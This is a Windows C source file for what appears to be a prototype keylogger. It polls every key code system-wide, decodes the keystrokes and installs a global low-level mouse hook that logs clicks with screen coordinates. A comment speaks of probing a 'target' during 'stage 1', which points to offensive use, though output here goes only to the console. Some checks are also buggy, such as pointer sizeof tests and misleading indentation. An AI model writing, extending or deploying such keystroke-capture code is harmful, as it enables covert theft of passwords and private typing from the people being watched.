#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

#define FF fflush(stdout);

/*
    MOCK SKELETON FOR KEYBOARD FUNCTIONALITY DEFINITIONS
*/

#define TK_SPACE 32
#define TK_ENTER 13
#define TK_ESCAPE 27
#define TK_BACKSPACE 8

inline POINT GetMouseCoordinates(void);

DWORD WINAPI KeyboardThread(LPVOID lpParam);
DWORD WINAPI MouseHookThread(LPVOID lpParameter);

LRESULT CALLBACK MouseProc(int mCode, WPARAM mwParam, LPARAM mlParam);

#define MEM_BUFF_SIZE 256

// determine which thread should print a newline
int THREAD_NEWLINE_CALLBACK = 0;


int main(void)
{
    HANDLE mHook;
    HANDLE kbThread;
    HANDLE mThread;

    // memory mapping handle
    HANDLE mMapFile;
    LPCTSTR mBuf;

    printf("[\033[0;34m*\033[0;m] Attempting to create shared memory mapping\n");

    mMapFile = CreateFileMapping(
        INVALID_HANDLE_VALUE, // use the paging file
        NULL,
        PAGE_READWRITE,
        0,
        MEM_BUFF_SIZE, // FILE MAPPING WITH A BUFFER SIZE OF 256
        TEXT("Local\\zPdmMx"));

    if (mMapFile == NULL)
    {
        printf("Failed to create file mapping object: %d\n", GetLastError());

        return -1;
    }

    printf("[\033[0;32m+\033[0;m] Created shared memory mapping with size of \033[0;32m%zu\033[0;m bytes @%p\n", sizeof(mMapFile), &mMapFile);

    mBuf = (LPTSTR)MapViewOfFile(mMapFile,
                                 FILE_MAP_ALL_ACCESS,
                                 0,
                                 0,
                                 MEM_BUFF_SIZE);

    if (mBuf == NULL)
    {
        printf("Failed to get a memory map view of the file! Error: %d\n", GetLastError());
        CloseHandle(mMapFile);

        return -1;
    }

    kbThread = CreateThread(NULL, 0, KeyboardThread, (LPVOID)mBuf, 0, NULL);

    if (kbThread == NULL)
    {
        printf("Failed to create a separate thread for the keyboard!\n");

        return -1;
    }

    mThread = CreateThread(NULL, 0, MouseHookThread, (LPVOID)mBuf, 0, NULL);

    if (mThread == NULL)
    {
        printf("Failed to create a separate thread for the mouse!\n");

        return -1;
    }

    // have test exe that determines which modules are supported by the target during stage 1

    while(1)
    {
        // we need to see what gets loaded first because the mouse hook should write to the shared memory region
        // and everytime the keyboardthread runs it should read from that shared area in memory so that it can set
        // a flag to let the function know not to print "KEY PRESSED: (0)"
        WaitForSingleObject(mThread, INFINITE);

        // how to send a code to a thread so when 'right mouse is clicked' the 
        // keyboard thread doesnt also print "KEY PRESSED: (0)"
        WaitForSingleObject(kbThread, INFINITE);

        /*
            IN A NEWER VERSION USE WaitForMultipleObjects(), add all HANDLE objects to array and pass to func
        */

        // WaitForMultipleObjects(2)
    }

    CloseHandle(mThread);
    CloseHandle(kbThread);
    CloseHandle(mMapFile);

    UnmapViewOfFile(mBuf);

    return 0;
}

/*
    THIS FUNCTION KEYBOARDTHREAD MUST BE REVISED TO FIX IMPROPER SHIFTKEY STDOUT STRING FORMATTING
*/
DWORD WINAPI KeyboardThread(LPVOID lpParameter)
{
    Sleep(300);

    int toEnd = 0;

    if (THREAD_NEWLINE_CALLBACK == 0)
    {
        // this is the first thread to start
        THREAD_NEWLINE_CALLBACK = 1;
        printf("++ KEYBOARD thread completed the race first.\n");
    }
    else
    {
        toEnd++;
    }

    int key;
    volatile LPCTSTR memBuf = (LPTSTR)lpParameter;

    printf("[\033[0;34m*\033[0;m] Invoking listener for keyboard events\n");

    if (sizeof(memBuf) == 0)
    {
        printf("(KEYBOARDTHREADEVENTS) MEMORY BUFFER SIZE IS 0!\n");
        return -1;
    }
    else
        Sleep(100);
        printf("(KEYBOARDTHREADEVENTS) SUCCESSFULL MEMORY BUFFER ALLOCATED: \033[0;32m%zd\033[0;m bytes | ADDR => @%p\n", sizeof(memBuf), &memBuf);

        if (toEnd)
            printf("\n");

    while (1)
    {
        for (key = 0; key < 256; key++)
        {
            SHORT keyState = GetAsyncKeyState(key);

            // -32767 is used to check if a key was pressed, if a key is pressed the most significant
            // bit will be set to 1, which results in a value of "-32767" since GetAsyncKeyState returns a SHORT
            if (keyState == -32767)
            {
                BOOL SHIFT_KEY_MAGIC; // custom logical state

                // If a key is pressed
                SHORT keyShift = GetKeyState(VK_SHIFT);

                // & 0x8000 = masking out all lower order bits while leaving high order bits intact
                // if = 0; shift key was not pressed
                BOOL SHIFT_KEY_PRESSED = (keyShift & 0x8000) != 0;

                // convert key code to a character
                BYTE kbState[256] = {0};

                // if shift is clicked set TRUE (0x80) which means the shift key should be considered as pressed when 
                // calling ToUnicode(), else 0 and the shift key should not be considered as pressed
                kbState[VK_SHIFT] = SHIFT_KEY_PRESSED ? 0x80 : 0;

                if (SHIFT_KEY_PRESSED)
                {
                    SHIFT_KEY_MAGIC = 1;
                }
                else
                {
                    SHIFT_KEY_MAGIC = 0;
                }

                WORD unicodeChar;

                if (ToUnicode(key, 0, kbState, &unicodeChar, 1, 0) != -1)
                {
                    if (SHIFT_KEY_MAGIC && (kbState != 0) == SHIFT_KEY_PRESSED) // redundant comparison
                    {
                        printf("KEY PRESSED: SHIFT + %c (%d)\n", (char) unicodeChar, unicodeChar);
                    }

                    switch ((char) unicodeChar)
                    {
                        case TK_SPACE:
                            printf("SPACE\n");
                            FF

                            break;

                        case TK_ESCAPE:
                            printf("ESCAPE\n");
                            FF

                            break;

                        case 13:
                            printf("ENTER\n");
                            FF

                            break;

                        case VK_TAB:
                            printf("TAB\n");
                            FF

                            break;

                        case TK_BACKSPACE:
                            printf("BACKSPACE\n");
                            FF

                            break;

                        default:
                            if (SHIFT_KEY_MAGIC)
                                break;

                            else
                                printf("KEY PRESSED: %c (%d) @%p\n", (char)unicodeChar, (WORD)unicodeChar, &unicodeChar);
                                FF
                    }  // .. end switch
                } // .. end if
            } // .. end if
        } // .. end for

        Sleep(10);
    } // .. end while

    return 0;
}


DWORD WINAPI MouseHookThread(LPVOID lpParameter)
{
    Sleep(300);

    int toEnd = 0;

    if (THREAD_NEWLINE_CALLBACK == 0)
    {
        // this is the first thread to start
        THREAD_NEWLINE_CALLBACK = 1;
        printf("++ MOUSE thread completed the race first.\n");
    }
    else 
    {
        toEnd++;
    }

    // obtain shared region of mapped memory
    volatile LPCTSTR memBuf = (LPTSTR)lpParameter;

    // write to shared memory
    // _snwprintf_s(memBuf, MEM_BUFF_SIZE, _TRUNCATE, "1");

    HHOOK mHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0);

    if (mHook == NULL)
    {
        printf("FAILED TO OBTAIN HOOK ON MOUSE!\n");

        return -1;
    }

    printf("[\033[0;34m*\033[0;m] Mouse Hook Status: \033[0;32mESTABLISHED\033[0;m\n\n");

    if (sizeof(memBuf) == 0)
    {
        printf("(MOUSEHOOKTHREAD) MEMORY BUFFER SIZE IS 0!\n");
        return -1;
    }
    else
        Sleep(100);
        printf("(MOUSEHOOKTHREAD) SUCCESSFULL MEMORY BUFFER ALLOCATED: \033[0;32m%zd\033[0;m bytes | ADDR => @%p\n", sizeof(memBuf), &memBuf);

        if (toEnd)
            printf("\n");

    MSG mMsg = {0};

    while (GetMessage(&mMsg, NULL, 0, 0))
    {
        TranslateMessage(&mMsg);
        DispatchMessage(&mMsg);
    }

    UnhookWindowsHookEx(mHook);

    return 0;
}


inline POINT GetMouseCoordinates(void)
{
    // this function returns the current mouse position when invoked by the caller
    POINT mousePnt;
    GetCursorPos(&mousePnt);

    return mousePnt;
}


LRESULT CALLBACK MouseProc(int mCode, WPARAM mwParam, LPARAM mlParam)
{
    if (mCode == HC_ACTION)
    {
        switch (mwParam)
        {
            case WM_LBUTTONDOWN:
                POINT WM_LBTN = GetMouseCoordinates();
                printf("Left mouse button clicked (x:%d, y:%d)\n", WM_LBTN.x, WM_LBTN.y);

                break;

            case WM_MBUTTONDOWN:
                POINT WM_MBTN = GetMouseCoordinates();
                printf("Middle mouse button clicked (x:%d, y:%d)\n", WM_MBTN.x, WM_MBTN.y);

                break;

            case WM_RBUTTONDOWN:
                POINT WM_RBTN = GetMouseCoordinates();
                printf("Right mouse button clicked (x:%d, y:%d)\n", WM_RBTN.x, WM_RBTN.y);

                break;

            default:
                break;
        }

    }

    return CallNextHookEx(NULL, mCode, mwParam, mlParam);
}